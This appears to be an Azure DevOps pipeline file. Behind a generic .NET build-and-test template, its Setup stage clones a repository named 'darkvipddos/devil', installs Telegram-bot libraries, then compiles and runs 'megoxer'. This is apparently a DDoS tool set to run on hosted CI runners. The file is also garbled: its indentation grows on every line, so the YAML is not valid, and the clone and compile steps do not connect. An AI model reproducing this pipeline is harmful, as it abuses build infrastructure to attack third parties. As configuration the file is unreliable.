# Name of the pipeline
name: CustomPipelineName_$(Build.BuildId)

# Trigger configuration
trigger:
  branches:
      include:
            - main  # Trigger pipeline for changes in the 'main' branch

            # Pool to specify where the pipeline will run
            pool:
              vmImage: 'ubuntu-latest'

              # Variables (optional)
              variables:
                buildConfiguration: 'Release'

                # Add repositories
                resources:
                  repositories:
                      - repository: additionalRepo  # Alias for the repository
                            type: git
                                  name: organization/other-repo  # Azure DevOps project and repo name
                                        ref: refs/heads/main          # Branch to clone
                                              endpoint: MyServiceConnection # Service connection for external authentication

                                              # Stages
                                              stages:
                                                - stage: Setup
                                                    displayName: Setup Environment and Clone Repo
                                                        jobs:
                                                              - job: Setup
                                                                      displayName: Setup the environment
                                                                              steps:
                                                                                        # Checkout the primary repository
                                                                                                  - checkout: self
                                                                                                              displayName: 'Checkout Primary Repository'

                                                                                                                        # Install necessary packages
                                                                                                                                  - script: |
                                                                                                                                                sudo apt-get update
                                                                                                                                                              sudo apt-get install -y python3 python3-pip
                                                                                                                                                                            pip install python-telegram-bot telebot pymongo aiohttp
                                                                                                                                                                                          sudo apt install g++ git -y
                                                                                                                                                                                                      displayName: 'Install Dependencies'

                                                                                                                                                                                                                # Clone the DARKDEVIL repository
                                                                                                                                                                                                                          - script: |
                                                                                                                                                                                                                                        git clone https://github.com/darkvipddos/devil.git
                                                                                                                                                                                                                                                      cd devil
                                                                                                                                                                                                                                                                  displayName: 'Clone devil Repository'

                                                                                                                                                                                                                                                                            # Compile and run the application
                                                                                                                                                                                                                                                                                      - script: |
                                                                                                                                                                                                                                                                                                    gcc megoxer.c -o megoxer -lpthread
                                                                                                                                                                                                                                                                                                                  python3 megoxer.py
                                                                                                                                                                                                                                                                                                                              displayName: 'Compile and Run Megoxer'

                                                                                                                                                                                                                                                                                                                                - stage: Build
                                                                                                                                                                                                                                                                                                                                    displayName: Build Stage
                                                                                                                                                                                                                                                                                                                                        dependsOn: Setup
                                                                                                                                                                                                                                                                                                                                            jobs:
                                                                                                                                                                                                                                                                                                                                                  - job: Build
                                                                                                                                                                                                                                                                                                                                                          displayName: Build the Application
                                                                                                                                                                                                                                                                                                                                                                  steps:
                                                                                                                                                                                                                                                                                                                                                                            # Checkout the primary repository
                                                                                                                                                                                                                                                                                                                                                                                      - checkout: self
                                                                                                                                                                                                                                                                                                                                                                                                  displayName: 'Checkout Primary Repository'

                                                                                                                                                                                                                                                                                                                                                                                                            # Use .NET SDK
                                                                                                                                                                                                                                                                                                                                                                                                                      - task: UseDotNet@2
                                                                                                                                                                                                                                                                                                                                                                                                                                  inputs:
                                                                                                                                                                                                                                                                                                                                                                                                                                                packageType: 'sdk'
                                                                                                                                                                                                                                                                                                                                                                                                                                                              version: '6.x'

                                                                                                                                                                                                                                                                                                                                                                                                                                                                        # Build the application
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  - script: dotnet build --configuration $(buildConfiguration)
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              displayName: 'Build Project'

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                - stage: Test
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    displayName: Test Stage
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        dependsOn: Build
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            jobs:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  - job: Test
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          displayName: Run Tests
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  steps:
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            # Checkout the primary repository
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      - checkout: self
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  displayName: 'Checkout Primary Repository'

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            # Run tests for the application
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      - script: dotnet test
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  displayName: 'Run Unit Tests'